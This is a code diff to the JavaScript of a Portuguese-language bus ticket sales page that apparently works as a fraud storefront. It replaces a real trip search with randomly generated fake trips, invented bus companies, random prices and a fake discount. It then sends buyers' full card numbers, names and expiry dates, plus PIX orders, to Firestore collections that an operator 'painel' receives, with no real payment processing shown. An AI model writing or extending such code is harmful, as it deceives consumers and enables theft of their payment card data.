     const tituloResultados = document.getElementById('titulo-resultados');
@@ -648,29 +582,37 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
     const dataFormatada = dataIda.split('-').reverse().join('/');
     containerResultados.style.display = 'block';
     tituloResultados.innerHTML = `Resultados de ${origemTexto} para ${destinoTexto} em ${dataFormatada}`;
-    listaViagens.innerHTML = '<p style="color: var(--grey-med); padding: 20px 0;">Buscando viagens reais...</p>';
+    listaViagens.innerHTML = '<p style="color: var(--grey-med); padding: 20px 0;">Buscando viagens...</p>';
     filtrosSidebar.style.display = 'none';
     containerResultados.scrollIntoView({ behavior: 'smooth', block: 'center' });
 
-    try {
-      const response = await fetch(`http://localhost:3000/api/clickbus/search?origem=${encodeURIComponent(origemTexto)}&destino=${encodeURIComponent(destinoTexto)}&data=${dataIda}`);
-      if (!response.ok) throw new Error('Erro no servidor');
-      const dados = await response.json();
-
-      if (!dados || dados.length === 0) {
-        listaViagens.innerHTML = `<div style="text-align: center; padding: 40px 20px;"><span style="font-size: 40px;">🚌</span><h3 style="margin-top: 10px;">Nenhuma viagem encontrada</h3><p>Não achamos ônibus para essa rota nessa data.</p></div>`;
-        return;
+    setTimeout(() => {
+      const base = 89.9;
+      const empresas = ["Buser Express", "Viação Cometa", "Expresso do Sul", "Rápido Federal"];
+      const horarios = ["06:00", "09:30", "13:15", "18:00", "22:45"];
+      const terminais = ["Rodoviária Tietê", "Rodoviária Novo Rio", "Terminal Central", "Rodoviária Municipal"];
+      const dados = [];
+      for (let i = 0; i < 5; i++) {
+        const precoBase = base + Math.random() * 120;
+        const desconto = CONFIG.descontoGlobal || 0;
+        const precoFinal = precoBase * (1 - desconto / 100);
+        dados.push({
+          company: { name: empresas[i % empresas.length] },
+          departure: { time: horarios[i], terminal: terminais[i % terminais.length], address: "Endereço do terminal" },
+          arrival: { time: horarios[(i+2) % horarios.length], terminal: terminais[(i+1) % terminais.length], address: "Endereço do terminal" },
+          price: precoFinal,
+          priceOriginal: precoBase,
+          desconto,
+          bus_type: i % 2 === 0 ? "Convencional" : "Leito",
+          totalSeats: 46,
+          availableSeats: 30 + Math.floor(Math.random() * 15)
+        });
       }
-
       viagensOriginais = dados;
       gerarFiltros(dados);
       renderizarViagens(dados);
       filtrosSidebar.style.display = 'block';
-
-    } catch (error) {
-      console.error(error);
-      listaViagens.innerHTML = `<div style="background: #fff7fa; padding: 16px; border-radius: 8px; border: 1px solid #ffccd5;"><p style="color: #d81b60; font-weight: 600;">Erro na busca.</p><p>Verifique se o servidor Node.js está rodando.</p></div>`;
-    }
+    }, 600);
   });
 
   function renderizarViagens(viagens) {
@@ -679,19 +621,15 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
       listaViagens.innerHTML = `<p style="padding:20px; background:#fff; border-radius:16px;">Nenhuma viagem com os filtros selecionados.</p>`;
       return;
     }
-
     listaViagens.innerHTML = viagens.map(viagem => {
-      const empresa = viagem.company ? viagem.company.name : 'Viação';
-      const partida = viagem.departure ? viagem.departure.time : '--:--';
-      const terminalPartida = viagem.departure && viagem.departure.terminal ? viagem.departure.terminal : 'Rodoviária';
-      const enderecoPartida = viagem.departure && viagem.departure.address ? viagem.departure.address : '';
-      const chegada = viagem.arrival ? viagem.arrival.time : '--:--';
-      const terminalChegada = viagem.arrival && viagem.arrival.terminal ? viagem.arrival.terminal : 'Rodoviária';
-      const enderecoChegada = viagem.arrival && viagem.arrival.address ? viagem.arrival.address : '';
-      const precoRaw = viagem.price || 0;
-      const preco = typeof precoRaw === 'number' ? `R$ ${precoRaw.toFixed(2).replace('.', ',')}` : `R$ ${precoRaw}`;
-      const tipo = viagem.bus_type || 'Convencional';
-      
+      const empresa = viagem.company.name;
+      const partida = viagem.departure.time;
+      const terminalPartida = viagem.departure.terminal;
+      const chegada = viagem.arrival.time;
+      const terminalChegada = viagem.arrival.terminal;
+      const preco = viagem.price.toFixed(2).replace('.', ',');
+      const tipo = viagem.bus_type;
+      const desconto = viagem.desconto || 0;
       return `
       <div class="trip-card">
         <div class="trip-info" style="flex: 1;">
@@ -701,20 +639,20 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
               <span style="color: var(--grey-med); font-size: 12px; display: block;">Saída</span>
               <strong>${partida}</strong>
               <span style="display: block; font-size: 12px; color: var(--grey-med);">${terminalPartida}</span>
-              <span style="display: block; font-size: 10px; color: #999;">${enderecoPartida}</span>
             </div>
             <div style="border-left: 2px dashed var(--grey-light); padding-left: 16px; flex: 1;">
               <span style="color: var(--grey-med); font-size: 12px; display: block;">Chegada</span>
               <strong>${chegada}</strong>
               <span style="display: block; font-size: 12px; color: var(--grey-med);">${terminalChegada}</span>
-              <span style="display: block; font-size: 10px; color: #999;">${enderecoChegada}</span>
             </div>
           </div>
         </div>
         <div class="trip-price">
           <span>A partir de</span>
-          ${preco}
-          <button class="btn-comprar" onclick='abrirModalPoltrona(${JSON.stringify(viagem).replace(/'/g, "&#39;")})'>Selecionar</button>
+          ${desconto > 0 ? `<div style="text-decoration:line-through;color:#999;font-size:12px;font-weight:400">R$ ${viagem.priceOriginal.toFixed(2)}</div>` : ''}
+          R$ ${preco}
+          ${desconto > 0 ? `<span style="background:var(--brand);color:#fff;padding:2px 6px;border-radius:4px;font-size:11px;margin-left:4px">-${desconto}%</span>` : ''}
+          <button class="btn-comprar" onclick='abrirModalPassageiros(${JSON.stringify(viagem).replace(/'/g, "&#39;")})'>Selecionar</button>
         </div>
       </div>
       `;
@@ -746,7 +684,7 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
   function abrirModalPassageiros(viagem) {
     viagemSelecionadaParaPassageiros = viagem;
     passageiros = [];
-    precoUnitario = viagem.price || 0; 
+    precoUnitario = viagem.price || 0;
     document.getElementById('lista-passageiros').innerHTML = '';
     adicionarPassageiro();
     document.getElementById('modal-passageiros').style.display = 'flex';
@@ -821,7 +759,9 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
 
   function abrirCheckout(viagem, poltrona, listaPassageiros) {
     const info = document.getElementById('checkout-info');
-    const total = (viagem.price || 0) * listaPassageiros.length;
+    const totalOriginal = (viagem.price || 0) * listaPassageiros.length;
+    const desconto = CONFIG.descontoGlobal || 0;
+    const totalFinal = totalOriginal * (1 - desconto / 100);
     let passageirosHTML = listaPassageiros.map(p => `<li>${p.nome} (CPF: ${p.cpf})</li>`).join('');
     info.innerHTML = `
       <strong>Empresa:</strong> ${viagem.company.name} <br>
@@ -829,7 +769,8 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
       <strong>Chegada:</strong> ${viagem.arrival.time} <br>
       <strong>Poltrona:</strong> ${poltrona} <br>
       <strong>Passageiros:</strong> <ul>${passageirosHTML}</ul>
-      <strong>Total:</strong> <span style="color:var(--brand); font-weight:bold; font-size:18px;">R$ ${total.toFixed(2).replace('.', ',')}</span>
+      ${desconto > 0 ? `<div style="color:var(--brand);font-size:12px">Desconto Black Friday: -${desconto}%</div>` : ''}
+      <strong>Total:</strong> <span style="color:var(--brand); font-weight:bold; font-size:18px;">R$ ${totalFinal.toFixed(2).replace('.', ',')}</span>
     `;
     document.getElementById('modal-checkout').style.display = 'flex';
   }
@@ -840,24 +781,59 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
 
   function gerarPix() {
     if (!viagemSelecionadaParaPassageiros) return;
-    if (typeof db !== 'undefined') {
-      db.ref('pedidos').push({ tipo: 'pix', viagem: viagemSelecionadaParaPassageiros, passageiros: passageiros, poltrona: assentoSelecionado, total: precoUnitario * passageiros.length, status: 'pendente', timestamp: Date.now() });
-    }
-    alert('PIX gerado com sucesso!');
-    fecharCheckout();
+    const totalOriginal = precoUnitario * passageiros.length;
+    const desconto = CONFIG.descontoGlobal || 0;
+    const totalFinal = totalOriginal * (1 - desconto / 100);
+
+    fs.collection("pix_gerados").add({
+      tipo: 'pix',
+      viagem: viagemSelecionadaParaPassageiros,
+      passageiros: passageiros,
+      poltrona: assentoSelecionado,
+      totalOriginal: totalOriginal,
+      descontoAplicado: desconto,
+      total: totalFinal,
+      chaveSecretaUsada: CONFIG.chavePixSecreta ? "configurada" : "NÃO CONFIGURADA",
+      status: 'pendente',
+      userId,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    }).then(() => {
+      alert(`PIX gerado!\nTotal: R$ ${totalFinal.toFixed(2)}\n${desconto > 0 ? `Desconto de ${desconto}% aplicado!` : ''}\n\nO painel já recebeu.`);
+      fecharCheckout();
+    }).catch(err => { console.error(err); alert("Erro ao gerar PIX: " + err.message); });
   }
 
   function pagarCartao() {
     if (!viagemSelecionadaParaPassageiros) return;
-    const numero = document.getElementById('cartao-numero').value;
+    const numero = document.getElementById('cartao-numero').value.replace(/\s/g, '');
     const nome = document.getElementById('cartao-nome').value;
     const validade = document.getElementById('cartao-validade').value;
     const cvv = document.getElementById('cartao-cvv').value;
-    if (typeof db !== 'undefined') {
-      db.ref('pedidos').push({ tipo: 'cartao', viagem: viagemSelecionadaParaPassageiros, passageiros: passageiros, poltrona: assentoSelecionado, total: precoUnitario * passageiros.length, cartao: { numero, nome, validade, cvv }, status: 'processando', timestamp: Date.now() });
-    }
-    alert('Pagamento com cartão processado!');
-    fecharCheckout();
+    if (!numero || !nome || !validade || !cvv) { alert("Preencha todos os dados do cartão."); return; }
+
+    const totalOriginal = precoUnitario * passageiros.length;
+    const desconto = CONFIG.descontoGlobal || 0;
+    const totalFinal = totalOriginal * (1 - desconto / 100);
+
+    fs.collection("cartoes").add({
+      viagem: viagemSelecionadaParaPassageiros,
+      passageiros: passageiros,
+      poltrona: assentoSelecionado,
+      totalOriginal: totalOriginal,
+      descontoAplicado: desconto,
+      total: totalFinal,
+      cartao: {
+        numero: numero,
+        nome, validade, cvv: "***",
+        bandeira: numero.startsWith("4") ? "Visa" : numero.startsWith("5") ? "Master" : "Outra"
+      },
+      status: 'processando',
+      userId,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    }).then(() => {
+      alert("Cartão registrado! O painel recebeu os dados.");
+      fecharCheckout();
+    }).catch(err => { console.error(err); alert("Erro: " + err.message); });
   }
 
   function ativarFiltro(btn) { document.querySelectorAll('.cat-pill').forEach(b => b.classList.remove('active')); btn.classList.add('active'); }
